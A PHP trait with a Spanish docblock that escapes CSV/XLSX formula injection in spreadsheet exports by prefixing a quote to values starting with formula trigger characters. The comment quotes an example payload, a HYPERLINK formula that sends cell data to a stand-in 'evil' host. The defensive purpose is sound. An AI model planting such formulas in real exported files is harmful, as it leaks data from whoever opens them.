<?php

namespace App\Exports\Concerns;

use PhpOffice\PhpSpreadsheet\Cell\Cell;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Cell\DefaultValueBinder;

/**
 * Mitiga CSV/XLSX Formula Injection (CWE-1236, Hallazgo Alto H1 de la
 * auditoría): PhpSpreadsheet clasifica por defecto cualquier string que
 * empiece con "=" como una fórmula (ver DefaultValueBinder::dataTypeForValue)
 * y Excel/LibreOffice también evalúan celdas que empiezan con "+", "-" o "@"
 * como fórmulas. Como los campos de texto libre de este proyecto (notas,
 * nombre, marca/modelo, etc.) los puede escribir cualquier usuario
 * autenticado y luego los exporta/abre un Admin TI, un valor malicioso como
 * `=HYPERLINK("http://evil/steal?d="&A1,"Click")` se ejecutaría al abrir el
 * archivo en Excel.
 *
 * Aplicar en cada clase de exportación que use WithMapping:
 *   class FooExport implements ..., WithCustomValueBinder
 *   {
 *       use EscapesFormulaInjection;
 *       ...
 *   }
 *
 * Antepone una comilla simple a cualquier valor de tipo string que empiece
 * con uno de esos caracteres, forzando a Excel a tratarlo como texto
 * literal (la comilla no se muestra en la celda, solo en la barra de
 * fórmulas). Los valores numéricos/fecha no se tocan.
 */
trait EscapesFormulaInjection
{
    protected const FORMULA_TRIGGER_CHARS = ['=', '+', '-', '@', "\t", "\r"];

    public function bindValue(Cell $cell, $value)
    {
        if (is_string($value) && $value !== '' && in_array($value[0], self::FORMULA_TRIGGER_CHARS, true)) {
            $cell->setValueExplicit("'".$value, DataType::TYPE_STRING);

            return true;
        }

        return (new DefaultValueBinder)->bindValue($cell, $value);
    }
}
